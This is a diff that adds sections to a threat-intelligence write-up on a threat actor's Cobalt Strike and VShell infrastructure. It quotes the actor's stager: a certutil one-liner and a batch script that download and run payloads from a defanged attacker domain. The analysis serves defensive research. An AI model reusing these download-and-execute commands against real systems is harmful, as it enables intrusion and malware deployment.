@@ -259,6 +259,15 @@ dns-beacon {
 [...REDACTED...]
 ```
 
+## Simulating Cat Cobalt Strike
+
+As we've recovered **all** relevant databases and binaries surrounding the Cobalt Strike server, we can run the binary using the threat actors configuration and authenticate locally. We will not be receiving call-backs from victims, but, we can interact with the GUI and reporting features built in. 
+
+[![2](/assets/images/china/cs_cat1.png)](/assets/images/china/cs_cat1.png){: .full}
+
+
+[![2](/assets/images/china/listeners.png)](/assets/images/china/listeners.png){: .full}
+
 # Cobalt Strike Post-Exploitation
 
 This threat actor appeared to use Cobalt Strike for persistence, privilege escalation, defence evasion, lateral movement and information harvesting. From Cobalt Strike logs, we were able to ascertain commands run and tooling executed by the threat actor: 
@@ -498,3 +507,44 @@ As you can see, by default, the dashboard is in Chinese. All future screenshots 
 [![2](/assets/images/china/image12.png)](/assets/images/china/image12.png){: .full}
 
 [![2](/assets/images/china/image11.png)](/assets/images/china/image11.png){: .full}
+
+On the translated “Monitoring Management” tab we can view all configured listening ports. Currently, on the domain microsoft-symantec[.]art, on TCP/8848 there is a VShell listener. Clicking the “Online command view” button we can view the default VShell execution command:
+
+[![2](/assets/images/china/image5.png)](/assets/images/china/image5.png){: .full}
+
+## VShell - Windows one-liner
+
+### Stage 1 
+
+```
+certutil.exe -urlcache -split -f hxxp://microsoft-symantec[.]art:8848/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat
+```
+
+* This uses the LOLBin, [`certutil.exe`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), in order to download a secondary payload - `C:\Users\Public.bat`
+
+### Stage 2
+
+We can download the batch script ourselves for further analysis:
+
+```
+@echo off
+setlocal enabledelayedexpansion
+
+set u64="hxxp://microsoft-symantec[.]art:8848/?h=microsoft-symantec.art&p=8848&t=tcp&a=w64&stage=true"
+set u32="hXXp://microsoft-symantec[.]art:8848/?h=microsoft-symantec.art&p=8848&t=tcp&a=w32&stage=true"
+set v="C:\Users\Public\07f79946tcp.exe"
+del %v%
+for /f "tokens=*" %%A in ('wmic os get osarchitecture ^| findstr 64') do (
+    set "ARCH=64"
+)
+if "%ARCH%"=="64" (
+    certutil.exe -urlcache -split -f %u64% %v%
+) else (
+    certutil.exe -urlcache -split -f %u32% %v%
+)
+
+start "" %v%
+exit /b 0
+
+We can see this second stage will enumerate the operating systems architecture and write the corresponding binary to the file path C:\Users\Public\07f79946tcp.exe.
+``` 
